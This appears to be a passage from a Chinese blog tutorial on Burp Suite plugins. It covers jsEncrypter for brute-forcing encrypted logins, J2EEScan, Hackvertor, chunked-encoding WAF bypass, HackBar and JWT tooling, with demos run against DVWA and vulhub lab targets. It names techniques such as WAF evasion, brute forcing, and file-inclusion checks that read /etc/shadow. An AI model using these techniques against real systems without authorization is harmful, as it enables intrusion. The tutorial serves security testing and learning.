</p><h2 id="3-3-安装插件"><a href="#3-3-安装插件" class="headerlink" title="3.3 安装插件"></a>3.3 安装插件</h2><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20191009175432.png" class="lozad"></p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20191009175535.png" class="lozad"></p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20191009175601.png" class="lozad"></p><h2 id="3-4-jsEncrypter插件使用"><a href="#3-4-jsEncrypter插件使用" class="headerlink" title="3.4 jsEncrypter插件使用"></a>3.4 jsEncrypter插件使用</h2><h3 id="3-4-1-运行靶机"><a href="#3-4-1-运行靶机" class="headerlink" title="3.4.1 运行靶机"></a>3.4.1 运行靶机</h3><p>项目提供了一个用php编写的靶机（jsEncrypter/server）,靶机提供了7个算法对密码进行加密后传输，后台解密，最后进行密码匹配。</p><ul><li>base64</li><li>md5</li><li>sha1</li><li>sha254</li><li>sha384</li><li>sha512</li><li>RSA</li></ul><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20191009175724.png" class="lozad"></p><h3 id="3-4-2-编写phantomJS运行脚本"><a href="#3-4-2-编写phantomJS运行脚本" class="headerlink" title="3.4.2 编写phantomJS运行脚本"></a>3.4.2 编写phantomJS运行脚本</h3><p><code>jsEncrypter/js/jsEncrypter_base.js</code>为插件phantomJS脚本模板。我们只需要将实现加密算法的js文件引入模板脚本，并在模板脚本的js_encrypt函数体中完成对加密函数的调用。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">......</span><br><span class="line">......</span><br><span class="line">......</span><br><span class="line">// 加载实现加密算法的js脚本</span><br><span class="line">var wasSuccessful = phantom.injectJs(&apos;xxx.js&apos;);/*引入实现加密的js文件*/</span><br><span class="line"> </span><br><span class="line">// 处理函数</span><br><span class="line">function js_encrypt(payload)&#123;</span><br><span class="line"> var newpayload;</span><br><span class="line"> /**********在这里编写调用加密函数进行加密的代码************/</span><br><span class="line">  /**********************************************************/</span><br><span class="line"> return newpayload;</span><br><span class="line">&#125;</span><br><span class="line">......</span><br><span class="line">......</span><br><span class="line">......</span><br></pre></td></tr></table></figure><p>项目jsEncrypter/server/TestScript目录下是编写好的对应靶机各个加密算法的phantomJS脚本，可以参考！</p><h3 id="3-4-3-运行phantomJS并测试"><a href="#3-4-3-运行phantomJS并测试" class="headerlink" title="3.4.3 运行phantomJS并测试"></a>3.4.3 运行phantomJS并测试</h3><p>运行phantomJS</p><p>测试的目的是为了确保我们编写的phantomJS脚本能够正常加密payload。</p><p><img alt data-src="https://github.com/c0ny1/jsEncrypter/raw/master/doc/test.gif" class="lozad"></p><h3 id="抓包暴力破解"><a href="#抓包暴力破解" class="headerlink" title="抓包暴力破解"></a>抓包暴力破解</h3><p><img alt="img" data-src="https://github.com/c0ny1/jsEncrypter/raw/master/doc/crack.gif" class="lozad"></p><h1 id="0x04-BurpBounty"><a href="#0x04-BurpBounty" class="headerlink" title="0x04 BurpBounty"></a>0x04 BurpBounty</h1><h2 id="4-1-介绍"><a href="#4-1-介绍" class="headerlink" title="4.1 介绍"></a>4.1 介绍</h2><p>Burp Bounty（BApp商店中的扫描检查生成器）是Burp Suite的扩展，它允许您以快速简单的方式通过非常直观的图形界面通过个性化规则改进主动和被动扫描仪。</p><h2 id="4-2-下载"><a href="#4-2-下载" class="headerlink" title="4.2 下载"></a>4.2 下载</h2><blockquote><p><a href="https://github.com/wagiro/BurpBounty/releases" target="_blank" rel="noopener">https://github.com/wagiro/BurpBounty/releases</a></p></blockquote><h2 id="4-3-安装"><a href="#4-3-安装" class="headerlink" title="4.3 安装"></a>4.3 安装</h2><p>1.在burp extender模块加载插件 </p><p><img alt data-src="https://s2.ax1x.com/2019/05/14/EoB6TH.png" class="lozad"></p><p>2.显示界面</p><p><img alt data-src="https://s2.ax1x.com/2019/05/14/EoDr3q.png" class="lozad"></p><h2 id="4-4-使用"><a href="#4-4-使用" class="headerlink" title="4.4 使用"></a>4.4 使用</h2><h3 id="4-4-1-基本使用"><a href="#4-4-1-基本使用" class="headerlink" title="4.4.1 基本使用"></a>4.4.1 基本使用</h3><p>1.选择 Profiles Directory</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20191015103956.png" class="lozad"></p><p>2.加载字典</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20191015102438.png" class="lozad"></p><p>3.过滤设置为all,扫描的时候启动全部项目</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20191015103922.png" class="lozad"></p><p>4.实验环境-DVWA</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20191015104026.png" class="lozad"></p><p>5.抓包拦截-执行主动扫描</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20191015103716.png" class="lozad"></p><p>6.扫描结果</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20191015104100.png" class="lozad"></p><h3 id="4-4-2-高级使用"><a href="#4-4-2-高级使用" class="headerlink" title="4.4.2 高级使用"></a>4.4.2 高级使用</h3><p>【添加扫描项目】</p><ol><li>命名</li><li>作者</li><li>选择扫描方式：主动扫描</li><li>选择request方式加载payload</li><li>选择payload设置：替换、添加</li><li>当然也可以选择payload编码方式</li></ol><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20191015104353.png" class="lozad"></p><ol start="7"><li>选择response方式,设置payload返回包匹配规则</li></ol><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20191015104430.png" class="lozad"></p><ol start="8"><li>选择issue,设置漏洞等级，细节描述等</li></ol><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20191015104455.png" class="lozad"></p><h1 id="0x05-JSBeautiful"><a href="#0x05-JSBeautiful" class="headerlink" title="0x05 JSBeautiful"></a>0x05 JSBeautiful</h1><h2 id="5-1-介绍"><a href="#5-1-介绍" class="headerlink" title="5.1 介绍"></a>5.1 介绍</h2><p>简单说一下就是美化网页资源JS CSS HTML XML的</p><h2 id="5-2-下载"><a href="#5-2-下载" class="headerlink" title="5.2 下载"></a>5.2 下载</h2><p><a href="https://github.com/irsdl/BurpSuiteJSBeautifier" target="_blank" rel="noopener">https://github.com/irsdl/BurpSuiteJSBeautifier</a></p><h2 id="5-3-安装"><a href="#5-3-安装" class="headerlink" title="5.3 安装"></a>5.3 安装</h2><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20191015105516.png" class="lozad"></p><p>导入后会出错，原因是还没有导入lib包，接着导入lib包即可。</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20191015110125.png" class="lozad"></p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20191015110330.png" class="lozad"></p><p>成功导入lib包后，再次到extensions模块下开启插件</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20191015110410.png" class="lozad"></p><p>然后会多出来一个标签栏</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20191015110534.png" class="lozad"></p><h2 id="5-4-使用"><a href="#5-4-使用" class="headerlink" title="5.4 使用"></a>5.4 使用</h2><p>随便访问GitHub网站，然后在拦截的数据包的返回包中右击，点击</p><p>beautify this。</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20191015111316.png" class="lozad"></p><p>点击以后会弹出一个小窗口，点击确定就可以了。</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20191015111755.png" class="lozad"></p><h1 id="0x06-Hackvertor"><a href="#0x06-Hackvertor" class="headerlink" title="0x06 Hackvertor"></a>0x06 Hackvertor</h1><h2 id="6-1-介绍"><a href="#6-1-介绍" class="headerlink" title="6.1 介绍"></a>6.1 介绍</h2><p>Hackvertor是一个基于标签的转换工具，支持各种转义和编码，包括HTML5实体，十六进制，八进制，unicode，url编码等。</p><ul><li>它使用类似XML的标记来指定使用的编码/转换类型。</li><li>您可以使用多个嵌套标记来执行转换。</li><li>标签也可以有参数，允许它们像函数一样运行。</li><li>它具有自动解码功能，可以猜测所需的转换类型并自动解码多次。</li><li>多个标签</li><li>字符集转换</li></ul><h2 id="6-2-下载"><a href="#6-2-下载" class="headerlink" title="6.2 下载"></a>6.2 下载</h2><p><a href="https://github.com/hackvertor/hackvertor" target="_blank" rel="noopener">https://github.com/hackvertor/hackvertor</a></p><h2 id="6-3-安装"><a href="#6-3-安装" class="headerlink" title="6.3 安装"></a>6.3 安装</h2><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20191015113437.png" class="lozad"></p><h2 id="6-4-使用"><a href="#6-4-使用" class="headerlink" title="6.4 使用"></a>6.4 使用</h2><h3 id="1-简单base64加密"><a href="#1-简单base64加密" class="headerlink" title="1.简单base64加密"></a>1.简单base64加密</h3><p>首先输入一个1</p><p><img alt="nEON7V.png" data-src="https://s2.ax1x.com/2019/09/04/nEON7V.png" class="lozad"></p><p>选中1，选择base64加密</p><p><img alt="nEOrc9.png" data-src="https://s2.ax1x.com/2019/09/04/nEOrc9.png" class="lozad"></p><h3 id="2-多层加密base64-md5"><a href="#2-多层加密base64-md5" class="headerlink" title="2.多层加密base64+md5"></a>2.多层加密base64+md5</h3><p><img alt="nEzuRO.png" data-src="https://s2.ax1x.com/2019/09/04/nEzuRO.png" class="lozad"></p><h3 id><a href="#" class="headerlink" title=" "></a> </h3><p><img alt="nEz8eA.png" data-src="https://s2.ax1x.com/2019/09/04/nEz8eA.png" class="lozad"></p><h3 id="3-大致布局"><a href="#3-大致布局" class="headerlink" title="3.大致布局"></a>3.大致布局</h3><p><img alt="nVSIgS.png" data-src="https://s2.ax1x.com/2019/09/04/nVSIgS.png" class="lozad"></p><p>charset               字符集</p><p>compression     压缩 </p><p>encrypt               加密</p><p>HMACMD5         计算基于哈希值的消息验证代码</p><h2 id="6-5-参考"><a href="#6-5-参考" class="headerlink" title="6.5 参考"></a>6.5 参考</h2><ol><li><a href="https://portswigger.net/bappstore/65033cbd2c344fbabe57ac060b5dd100" target="_blank" rel="noopener">https://portswigger.net/bappstore/65033cbd2c344fbabe57ac060b5dd100</a></li><li><a href="https://portswigger.net/blog/bypassing-wafs-and-cracking-xor-with-hackvertor" target="_blank" rel="noopener">https://portswigger.net/blog/bypassing-wafs-and-cracking-xor-with-hackvertor</a></li></ol><h1 id="0x07-jsonBeautiful"><a href="#0x07-jsonBeautiful" class="headerlink" title="0x07 jsonBeautiful"></a>0x07 jsonBeautiful</h1><h2 id="7-1-介绍"><a href="#7-1-介绍" class="headerlink" title="7.1 介绍"></a>7.1 介绍</h2><p>简单来说就是美化json的，让json数据看起来更加美观 </p><h2 id="7-2-下载"><a href="#7-2-下载" class="headerlink" title="7.2 下载"></a>7.2 下载</h2><h2 id="7-3-安装"><a href="#7-3-安装" class="headerlink" title="7.3 安装"></a>7.3 安装</h2><p>在BApp Store中下载</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20191015114642.png" class="lozad"></p><h2 id="7-4-使用"><a href="#7-4-使用" class="headerlink" title="7.4 使用"></a>7.4 使用</h2><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20191015140742.png" class="lozad"></p><h1 id="0x08-J2EEscan"><a href="#0x08-J2EEscan" class="headerlink" title="0x08 J2EEscan"></a>0x08 J2EEscan</h1><h2 id="8-1-介绍"><a href="#8-1-介绍" class="headerlink" title="8.1 介绍"></a>8.1 介绍</h2><p>J2EEScan是Burp Suite的插件。此插件的目标是在J2EE应用程序的Web应用程序渗透测试期间改进测试覆盖率。【官方】</p><p>J2EEScan能测漏洞，比如<span style="color: rgb(68, 68, 68);">Apache Struts</span>、<span style="color: rgb(68, 68, 68);">JBoss</span>、<span style="color: rgb(68, 68, 68);"><span style="color: rgb(68, 68, 68);">Java Server</span>、<span style="color: rgb(68, 68, 68);">Tom猫、等东东的漏洞。【非高大尚解释】</span></span></p><h3 id="测试用例："><a href="#测试用例：" class="headerlink" title="测试用例："></a>测试用例：</h3><p><strong>杂项</strong></p><ul><li>表达语言注入（CVE-2011-2730）</li><li>Apache Roller OGNL注射液（CVE-2013-4212）</li><li>本地文件包括 - /WEB-INF/web.xml已检索</li><li>本地文件包含 - 检索Spring应用程序上下文</li><li>本地文件包含 - 检索到struts.xml</li><li>本地文件包含 - 检索到weblogic.xml</li><li>本地文件包含 - 检索到的ibm-ws-bnd.xml</li><li>本地文件包含 - ibm-web-ext.xmi检索</li><li>本地文件包含 - 检索到的ibm-web-ext.xml</li><li>本地文件包含 - / etc / shadow已检索</li><li>本地文件包含 - / etc / passwd已检索</li><li>HTTP Auth弱密码</li><li>检索到WEB-INF应用程序配置文件</li><li>状态Servlet（CVE-2008-3273）</li><li>Snoop Servlet（CVE-2012-2170）</li><li>扩展路径遍历扫描</li><li>AJP服务检测 - 感谢<a href="https://twitter.com/_ikki" target="_blank" rel="noopener">@ikki</a></li><li>弹簧启动执行器控制台</li><li>UTF8响应拆分</li><li>JK管理端点</li><li>Pivotal Spring Traversal（CVE-2014-3625）</li></ul><p><strong>Apache Struts</strong></p><ul><li>Apache Struts 2 S2-023 - 感谢<a href="https://twitter.com/h3xstream" target="_blank" rel="noopener">@ h3xstream</a></li><li>Apache Struts 2 S2-016</li><li>Apache Struts 2 S2-017</li><li>Apache Struts 2 S2-020</li><li>Apache Struts 2 S2-021</li><li>Apache Struts 2 S2-032</li><li>Apache Struts DevMode已启用</li><li>Apache Struts OGNL控制台</li></ul><p><strong>Grails的</strong></p><ul><li>Grails Path Traversal（CVE-2014-0053）</li></ul><p><strong>Apache Wicket</strong></p><ul><li>Apache Wicket任意资源访问（CVE-2015-2080）</li></ul><p><strong>Java Server Faces</strong></p><ul><li>Java Server Faces本地文件包含（CVE-2013-3827 CVE-2011-4367）</li></ul><p><strong>JBoss SEAM</strong></p><ul><li>JBoss SEAM远程命令执行（CVE-2010-1871）</li></ul><p><strong>错误处理不正确</strong></p><ul><li>JSF</li><li>Apache Struts</li><li>Apache Tapestry</li><li>Grails的</li><li>GWT</li><li>Java的</li></ul><p><strong>XML安全性</strong></p><ul><li>X包括支持</li><li>XML外部实体</li></ul><p><strong>信息披露问题</strong></p><ul><li>远程JVM版本</li><li>Apache Tomcat版本</li><li>码头版</li><li>Oracle Application Server版本</li><li>Oracle Glassfish版本</li><li>Oracle Weblogic版本</li></ul><p><strong>合规性检查</strong></p><ul><li>web.xml - HTTP动词篡改</li><li>web.xml - 会话跟踪的URL参数</li><li>web.xml - 不完整的错误处理</li><li>web.xml - Invoker Servlet</li></ul><p><strong>JBoss</strong></p><ul><li>JBoss Web服务枚举</li><li>JBoss管理员控制台弱密码</li><li>JBoss JMX / Web控制台不受密码保护</li><li>JBoss JMX Invoker远程命令执行</li><li>JBoss Undertow目录遍历（CVE-2014-7816）</li><li>JBoss jBPM管理控制台</li></ul><p><strong>Tomcat</strong></p><ul><li>Tomcat Manager控制台弱密码</li><li>Tomcat Host Manager控制台弱密码</li><li>生命终结软件 - Tomcat</li></ul><p><strong>Weblogic</strong></p><ul><li>Weblogic UDDI Explorer Detection</li><li>Weblogic UDDI Explorer SSRF漏洞（CVE-2014-4210）</li><li>Weblogic管理控制台弱密码</li></ul><p><strong>Oracle应用服务器</strong></p><ul><li>添加了对Oracle Log Database Accessible的检查</li><li>添加了对多个Oracle应用服务器默认资源的检查（CVE-2002-0565，CVE-2002-0568，CVE-2002-0569）</li><li>生命周期结束软件 - Oracle应用服务器</li></ul><p><strong>码头</strong></p><ul><li>由<a href="https://twitter.com/gdssecurity/" target="_blank" rel="noopener">@gdssecurity</a>发现的Jetty Remote Leak Shared Buffers（CVE-2015-2080）</li><li>生命终结软件 - 码头</li></ul><p><strong>Apache Axis</strong></p><ul><li>Apache Axis2 - Web服务枚举</li><li>Apache Axis2 - 管理控制台弱密码</li><li>Apache Axis2 - 本地文件包含漏洞（OSVDB 59001）</li><li>Apache Axis2 - Happy Axis</li></ul><p><strong>NodeJS</strong></p><ul><li>NodeJS HTTP重定向（CVE-2015-1164）</li><li>NodeJS HTTP响应拆分（CVE-2016-2216）</li></ul><h2 id="8-2-下载"><a href="#8-2-下载" class="headerlink" title="8.2 下载"></a>8.2 下载</h2><h2 id="8-3-安装"><a href="#8-3-安装" class="headerlink" title="8.3 安装"></a>8.3 安装</h2><ul><li>从“选项” - &gt;“会话”中的“Cookie jar”部分启用扫描程序字段</li><li>在Burp Extender选项卡中加载J2EEscan jar</li><li>该插件至少需要Java 1.7</li></ul><p><strong>1) Cookie Jar启动扫描程序</strong></p><p>Burp通过维护Cookie jar来维护你访问过得所有web站点的cookie信息，Cookie jar的信息在Burp的所有工具组件之间是数据共享的。</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20191015141813.png" class="lozad"></p><p>我们可以通过上图中的勾选项配置，来指定Cookie jar在哪些工具组件之间生效。</p><p><strong>2) 下载安装J2EEScan</strong></p><p>在Burp Extender选项卡中，找到J2EEscan jar<strong>，</strong>点击<strong>install</strong>进行安装</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20191015141858.png" class="lozad"></p><p><strong>3）java版本至少为1.7</strong></p><p>运行Java -version 检测</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20191015141928.png" class="lozad"></p><h2 id="8-4-使用"><a href="#8-4-使用" class="headerlink" title="8.4 使用"></a>8.4 使用</h2><h3 id="8-4-1-搭建测试环境【S2-016"><a href="#8-4-1-搭建测试环境【S2-016" class="headerlink" title="8.4.1 搭建测试环境【S2-016]"></a>8.4.1 搭建测试环境【S2-016]</h3><p><em>找了好多集成测试平台，都不合适，只能用vulhub自己搭建一个了。</em></p><p>_关于具体搭建方法可以参考<a href="https://vulhub.org/" target="_blank" rel="noopener">vulhub官网</a>，有视频有文档。<br>_</p><p><strong>kali 下搭建 ：<br>第一步：执行命令 sudo apt  install docker.io</strong></p><p><img alt="2019-04-01_211301.png" data-src="https://image.3001.net/images/20190401/1554124646_5ca20f66975d5.png!small" class="lozad">*<em>碰到y/n  或者 yes / not   一律yes *</em></p><p><img alt="2019-04-01_211340.png" data-src="https://image.3001.net/images/20190401/1554124659_5ca20f7339b86.png!small" class="lozad"><strong>第二步：检测docker是否安装成功，命令行执行：docker -v<br><img alt="2019-04-01_212527.png" data-src="https://image.3001.net/images/20190401/1554125206_5ca21196624a8.png!small" class="lozad">**</strong>第三步：启动docker,命令行执行：sudo service  docker  start<br>              查看是否启动成功执行：sudo service docker status,running代表启动成功**</p><p><img alt="2019-04-01_212431.png" data-src="https://image.3001.net/images/20190401/1554125354_5ca2122a9e100.png!small" class="lozad">**第四步：安装docker-compose ,执行命令：pip install docker-compose<br> 我这之前装过already</p><p>**</p><p><strong><img alt="2019-04-01_213238.png" data-src="https://image.3001.net/images/20190401/1554125577_5ca21309c93ee.png!small" class="lozad"><br><span></span></strong></p><p><strong>第五步：安装下载vulhub,执行命令： git clone <a href="https://github.com/vulhub/vulhub.git" target="_blank" rel="noopener">https://github.com/vulhub/vulhub.git</a><img alt="2019-04-01_213552.png" data-src="https://image.3001.net/images/20190401/1554125775_5ca213cfc734b.png!small" class="lozad">**</strong>_我这个随便搞得，建议git clone 的时候，在/tmp目录下执行【安装过程慢得很啊】<br>_<br>第六步：安装好后进入到vulhub,目录，选择一个你想创建使用的漏洞执行：docker-compose up -d 即可<br><img alt="2019-04-01_214211.png" data-src="https://image.3001.net/images/20190401/1554126257_5ca215b1c614b.png!small" class="lozad"><strong>**执行完就等着吧，，，慢的很</strong><br><img alt="2019-04-01_214608.png" data-src="https://image.3001.net/images/20190401/1554126386_5ca21632c0dc6.png!small" class="lozad"></p><h3 id="8-4-2-使用演示"><a href="#8-4-2-使用演示" class="headerlink" title="8.4.2 使用演示"></a>8.4.2 使用演示</h3><p><strong>1) 访问漏洞地址：<a href="http://192.168.6.145:8080/index.action?" target="_blank" rel="noopener">http://192.168.6.145:8080/index.action?</a></strong></p><p><img alt="2019-04-01_220425.png" data-src="https://image.3001.net/images/20190401/1554127574_5ca21ad68acdc.png!small" class="lozad"><strong>2) 为确定是否成功搭建环境，我们事先用工具验证一下是否存在s2-016</strong></p><p><img alt="2019-04-01_220715.png" data-src="https://image.3001.net/images/20190401/1554127663_5ca21b2fca097.png!small" class="lozad"><strong>3) 打开burp suite,进行抓包，并扫描网站</strong></p><p><img alt="2019-04-01_220252.png" data-src="https://image.3001.net/images/20190401/1554127751_5ca21b87220ee.png!small" class="lozad"><strong>4)切换到scanner 里面观察，等待</strong></p><p><img alt="2019-04-01_221847.png" data-src="https://image.3001.net/images/20190401/1554128394_5ca21e0aeddf6.png!small" class="lozad"><strong>这里面扫出来的是S2-017,其实是没扫完，在Scan queue队列可以看到只扫了33%</strong></p><h3 id="-1"><a href="#-1" class="headerlink" title></a><img alt="2019-04-01_222037.png" data-src="https://image.3001.net/images/20190401/1554128497_5ca21e71eb209.png!small" class="lozad"></h3><h3 id="8-4-3-注意事项"><a href="#8-4-3-注意事项" class="headerlink" title="8.4.3 注意事项"></a>8.4.3 注意事项</h3><p>1）使用前，请确保cookier jar里面选择scanner</p><p>2) J2EEScan,并不像其他 插件一样有单独的菜单</p><h3 id="-2"><a href="#-2" class="headerlink" title></a><img alt="2019-04-02_094025.png" data-src="https://image.3001.net/images/20190402/1554169351_5ca2be0755580.png!small" class="lozad"></h3><h2 id="8-5-参考"><a href="#8-5-参考" class="headerlink" title="8.5 参考"></a>8.5 参考</h2><p>Burpsuite插件之J2EEScan使用方法</p><p><a href="https://www.uedbox.com/post/59166/" target="_blank" rel="noopener">https://www.uedbox.com/post/59166/</a></p><p><a href="https://github.com/lilifengcode/Burpsuite-Plugins-Usage" target="_blank" rel="noopener">https://github.com/lilifengcode/Burpsuite-Plugins-Usage</a></p><h1 id="0x09-chunked-coding-converter"><a href="#0x09-chunked-coding-converter" class="headerlink" title="0x09 chunked-coding-converter"></a>0x09 chunked-coding-converter</h1><h2 id="9-1-介绍"><a href="#9-1-介绍" class="headerlink" title="9.1 介绍"></a>9.1 介绍</h2><p>chunked 是 http 协议里面的分块传输，简单说就是一个数据传输方式，之后将数据一段一段传过去，waf 无法检测到，就是绕过了，可以结合 sqlmap 来玩.</p><h2 id="9-2-下载"><a href="#9-2-下载" class="headerlink" title="9.2 下载"></a>9.2 下载</h2><blockquote><p><a href="https://github.com/c0ny1/chunked-coding-converter" target="_blank" rel="noopener">https://github.com/c0ny1/chunked-coding-converter</a></p><p>下载地址：<a href="http://pan.ximcx.cn/show/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7/BurpSuite%E5%B8%B8%E7%94%A8%E6%8F%92%E4%BB%B6/chunked-coding-converter.0.2.1.jar" target="_blank" rel="noopener">传送门</a></p></blockquote><h2 id="9-3-安装"><a href="#9-3-安装" class="headerlink" title="9.3 安装"></a>9.3 安装</h2><p>在burp extender模块加载插件 ，与之前的插件安装类似，将下载来下的插件jar包复制到burpsuite的插件文件夹中，然后再burp suite的extender模块去导入jar包即可。</p><h2 id="9-4-使用"><a href="#9-4-使用" class="headerlink" title="9.4 使用"></a>9.4 使用</h2><p><a href="https://github.com/c0ny1/chunked-coding-converter/blob/master/doc/menu.png" target="_blank" rel="noopener"><img alt="菜单" data-src="https://github.com/c0ny1/chunked-coding-converter/raw/master/doc/menu.png" class="lozad"></a></p><p><a href="https://github.com/c0ny1/chunked-coding-converter/blob/master/doc/config.png" target="_blank" rel="noopener"><img alt="配置" data-src="https://github.com/c0ny1/chunked-coding-converter/raw/master/doc/config.png" class="lozad"></a></p><blockquote><p>分块传输相关文章：</p><ul><li><a href="https://www.anquanke.com/post/id/169738" target="_blank" rel="noopener">利用分块传输吊打所有WAF</a></li><li><a href="https://www.freebuf.com/news/193659.html" target="_blank" rel="noopener">在HTTP协议宪法绕过WAF</a></li><li><a href="https://mp.weixin.qq.com/s?__biz=Mzg3NjA4MTQ1NQ==&mid=2247483787&idx=1&sn=54c33727696f8ee6d67f997acc11ab89&chksm=cf36f9cbf84170dd7da9b48b3365fb05d7ccec6bdeff480d0c38962f712e400a40b2b38dc467&token=360242838&lang=zh_CN#rd" target="_blank" rel="noopener">编写Burp分块传输插件绕WAF</a></li></ul></blockquote><h2 id="9-5-参考"><a href="#9-5-参考" class="headerlink" title="9.5 参考"></a>9.5 参考</h2><p><a href="https://mp.weixin.qq.com/s?__biz=Mzg3NjA4MTQ1NQ==&mid=2247483787&idx=1&sn=54c33727696f8ee6d67f997acc11ab89&chksm=cf36f9cbf84170dd7da9b48b3365fb05d7ccec6bdeff480d0c38962f712e400a40b2b38dc467&token=360242838&lang=zh_CN#rd" target="_blank" rel="noopener">编写Burp分块传输插件绕WAF</a></p><h1 id="0x10-domain-hunter"><a href="#0x10-domain-hunter" class="headerlink" title="0x10 domain_hunter"></a>0x10 domain_hunter</h1><h2 id="10-1-介绍"><a href="#10-1-介绍" class="headerlink" title="10.1 介绍"></a>10.1 介绍</h2><p>扫描子域名的一个插件</p><h2 id="10-2-下载"><a href="#10-2-下载" class="headerlink" title="10.2 下载"></a>10.2 下载</h2><blockquote><p>github地址：<a href="https://github.com/bit4woo/domain_hunter" target="_blank" rel="noopener">https://github.com/bit4woo/domain_hunter</a></p><p>下载地址：<a href="https://github.com/bit4woo/domain_hunter/releases" target="_blank" rel="noopener">https://github.com/bit4woo/domain_hunter/releases</a></p></blockquote><h2 id="10-3-安装"><a href="#10-3-安装" class="headerlink" title="10.3 安装"></a>10.3 安装</h2><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20191015153833.png" class="lozad"></p><p>安装完成后，会多一个选项卡</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20191015153852.png" class="lozad"></p><h2 id="10-4-使用"><a href="#10-4-使用" class="headerlink" title="10.4 使用"></a>10.4 使用</h2><p>第一步：点击 add,添加关键字<br>第二步：访问网站，要有流量才能分析<br>第三步：点击 search</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20191015153918.png" class="lozad"></p><h1 id="0x11-HackBar"><a href="#0x11-HackBar" class="headerlink" title="0x11  HackBar"></a>0x11  HackBar</h1><h2 id="11-1-介绍"><a href="#11-1-介绍" class="headerlink" title="11.1 介绍"></a>11.1 介绍</h2><p>功能和火狐上的插件hackbar差不多，但是相对有些区别，好用还是挺好用的。</p><h2 id="11-2-下载"><a href="#11-2-下载" class="headerlink" title="11.2 下载"></a>11.2 下载</h2><blockquote><p><a href="https://github.com/d3vilbug/HackBar/releases/tag/1.0" target="_blank" rel="noopener">https://github.com/d3vilbug/HackBar/releases/tag/1.0</a></p></blockquote><h2 id="11-3-安装"><a href="#11-3-安装" class="headerlink" title="11.3 安装"></a>11.3 安装</h2><p>下载插件，点击 burpsuite 的 extender 模块添加就行</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20191015154402.png" class="lozad"></p><p>安装完，鼠标右键会发现“HACK Bar”</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20191015154438.png" class="lozad"></p><h2 id="11-4-使用"><a href="#11-4-使用" class="headerlink" title="11.4 使用"></a>11.4 使用</h2><p>在你拦截的数据包，选中要替换的数据，选择 hack bar 的相应功能即可，有 sql 注入，xxe,xss,一些常见的 webshell 等；下面用 LFI 举例</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20191015154533.png" class="lozad"></p><p>点完，就替换成功了</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20191015154549.png" class="lozad"></p><h1 id="0x12-json-web-tokens"><a href="#0x12-json-web-tokens" class="headerlink" title="0x12 json-web-tokens"></a>0x12 <strong>json-web-tokens</strong></h1><h2 id="12-1-介绍"><a href="#12-1-介绍" class="headerlink" title="12.1 介绍"></a>12.1 介绍</h2><p>json-web-tokens,简称JWT ，快速入门：<a href="http://www.ruanyifeng.com/blog/2018/07/json_web_token-tutorial.html" target="_blank" rel="noopener">传送门</a></p><h2 id="12-2-下载"><a href="#12-2-下载" class="headerlink" title="12.2 下载"></a>12.2 下载</h2><blockquote><p><a href="https://github.com/PortSwigger/json-web-tokens" target="_blank" rel="noopener">https://github.com/PortSwigger/json-web-tokens</a></p></blockquote><h2 id="12-3-安装"><a href="#12-3-安装" class="headerlink" title="12.3 安装"></a>12.3 安装</h2><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20191015155642.png" class="lozad"></p><h2 id="12-4-使用"><a href="#12-4-使用" class="headerlink" title="12.4 使用"></a>12.4 使用</h2><p>访问项目主页的演示环境 <a href="https://oz-web.com/jwt/，之后访问页面，burp" target="_blank" rel="noopener">https://oz-web.com/jwt/，之后访问页面，burp</a> 抓包</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20191015155835.png" class="lozad"></p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20191015155903.png" class="lozad"></p><p><img alt 